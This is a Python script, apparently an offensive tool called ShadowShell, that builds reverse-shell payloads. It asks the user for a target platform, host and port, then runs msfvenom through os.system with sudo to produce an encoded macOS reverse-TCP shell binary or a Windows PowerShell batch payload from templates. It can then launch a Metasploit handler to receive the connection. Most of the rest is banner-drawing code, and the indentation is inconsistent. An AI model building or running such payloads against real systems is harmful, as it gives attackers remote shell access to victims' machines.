import os, random

def menu():
    banner()
    print("─╼┤architecture├───────────────────────────────────\n")
    print("\t\t(1) macho (osx)")
    print("\t\t(2) powershell (win)\n")
    mode = input("─╼┤selection├─> ")
    payloadGenerator(mode)

def payloadGenerator(mode):        
    if mode == "1":
        print("\n")
        host = input("─╼┤HOST├─> ")
	port = input("─╼┤PORT├─> ")
	command = "sudo msfvenom -p osx/x86/shell_reverse_tcp LHOST="+host+" LPORT="+port+" -a x86 --platform osx -e x86/shikata_ga_nai -o shadowpayload.macho"
        os.system(command)
        
    elif mode == "2":
        print("─╼┤templates├──────────────────────────────────────\n")
        os.system("ls templates")
        template = input("\n─╼┤selection├─> ")
        print("\n")
        command = "sudo msfvenom -p generic/custom PAYLOADFILE=templates/"+template+" -a x86 --platform win -e psbase NOEXIT SYSWOW64 -o shadowpayload.bat"
        os.system(command)
        
    print("\n")
    handler = input("─╼┤launch handler?(Y/n)├─> ")
    if handler == "y":
        launchHandler()
    elif handler == "Y":
        launchHandler()
    else:
        exit()
    
def launchHandler():
    print("\n")
    command = "msfconsole -r handler.conf"
    os.system(command)
    
def banner():

	padding = '  '
	S = [[' ','┌','─','┐'],
	     [' ','└','─','┐'],
	     [' ','└','─','┘']]
	H = [[' ','┬',' ','┬'],
	     [' ','├','─','┤'],
	     [' ','┴',' ','┴']]
	A = [[' ','┌','─','┐'],
	     [' ','├','─','┤'],
	     [' ','┴',' ','┴']]
	D = [[' ','┬','─','┐'],
	     [' ','│',' ','│'],
	     [' ','┴','─','┘']]
	O = [[' ','┌','─','┐'],
	     [' ','│',' ','│'],
	     [' ','└','─','┘']]
	W = [[' ','┬',' ',' ','┬'],
	     [' ','│','┌','┐','│'],
	     [' ','└','┘','└','┘']]
	E = [[' ','┌','─','┐'],
	     [' ','├','┤',' '],
	     [' ','└','─','┘']]
	L = [[' ','┬',' ',' '],
	     [' ','│',' ',' '],
	     [' ','┴','─','┘']]
	
	banner = [S,H,A,D,O,W,S,H,E,L,L]
	final = []
	print('\r')
	init_color = random.randint(10,15)
	txt_color = init_color
	cl = 0

	for charset in range(0, 3):
		for pos in range(0, len(banner)):
			for i in range(0, len(banner[pos][charset])):
				clr = f'\033[38;5;{txt_color}m'
				char = f'{clr}{banner[pos][charset][i]}'
				final.append(char)
				cl += 1
				txt_color = txt_color + 36 if cl <= 3 else txt_color

			cl = 0

			txt_color = init_color
		init_color += 31

		if charset < 2: final.append('\n   ')

	print(f"   {''.join(final)}")
	print(f'{padding}                 by z0nd3rl1ng\n')

if __name__ == "__main__":
	menu()
